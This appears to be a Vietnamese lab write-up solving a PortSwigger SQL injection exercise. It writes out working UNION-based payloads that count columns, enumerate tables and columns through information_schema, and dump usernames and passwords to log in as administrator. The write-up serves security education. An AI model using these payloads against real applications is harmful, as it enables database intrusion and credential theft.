# SQL injection attack, listing the database contents on non-Oracle databases

# 1. Vulnerable

```
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.
```

Lab này yêu cầu ta phải sử dụng lỗ hổng `SQLi` để xâm nhập vào cơ sở dữ liệu để đọc hết 2 bảng `username` và `password` để lấy thông tin đăng nhập của `administrator`

# 2. Exploit

Đầu tiên ta phải xác định số lượng cột truy vấn vào cơ sở dữ liệu của trang web bằng `UNION attack`

```
'+UNION+SELECT+null,null--
```

![union.png](images/union.png)

Kế đến, để tìm tên bảng chứa tên các cột (trong đó có các cột chứa `username` và `password`). Trong [SQLi_Cheat_sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) có chứa 1 đoạn đó là `Database contents`

```
Oracle	    SELECT * FROM all_tables
            SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL	SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL	    SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

Đầu bài có nói database ở đây không dừng Oracle

`information_schema.tables` là một bảng đặc biệt có sẵn trong hầu hết hệ quản trị cơ sở dữ liệu, bao gồm MySQL, PostgreSQL, SQL Server và nhiều hệ thống quản lý cơ sở dữ liệu khác. Bảng này chứa thông tin về các bảng có trong cơ sở dữ liệu của bạn.

Thông thường, information_schema.tables chứa các cột sau:

- table_catalog: Tên của cơ sở dữ liệu mà bảng thuộc về (một DBMS có thể hỗ trợ nhiều cơ sở dữ liệu).
- table_schema: Tên của schema (không gian tên) mà bảng thuộc về (một cơ sở dữ liệu có thể chứa nhiều schema).
- table_name: Tên của bảng.
- table_type: Loại bảng (ví dụ: "BASE TABLE" cho bảng thường, "VIEW" cho xem).
- engine: Đối với MySQL, thông tin về engine (ví dụ: InnoDB, MyISAM).
- version: Phiên bản của bảng (thông tin cho một số DBMS).
- row_format: Định dạng hàng lưu trữ dữ liệu (đối với MySQL).

Từ đó ta có thể xem hết tên của các bảng có trong `information_schema.tables` bằng payload:

```
SELECT+table_name,null+FROM+information_schema.tables
```

![user.png](images/user.png)

Vậy đã xác định được bảng user chứa các cột thông tin

Kế đến sau khi biết được tên bảng chứa các cột thì ta sử dụng tiếp [SQLi_Cheat_sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) ở đây có `information_schema.columns` chứa các cột trong bảng

Ta có payload sau để lấy thông tin về các cột trong bảng:

```
'+UNION+SELECT+column_name,null+FROM+information_schema.columns+WHERE+table_name='users_fgixha'--
```

![sol.png](images/sol.png)

Sau khi có 2 cột username và password cần thiết rồi thì công việc đơn giản tiếp theo là lấy tất cả thông tin từ 2 cột này thôi

```
'+UNION+SELECT+username_yfqqcr,password_fipsuk+FROM+users_fgixha--
```

![admin.png](images/admin.png)


Và ta đã lấy được thông tin của `admin`

Login và soled!

![solved.png](images/solved.png)
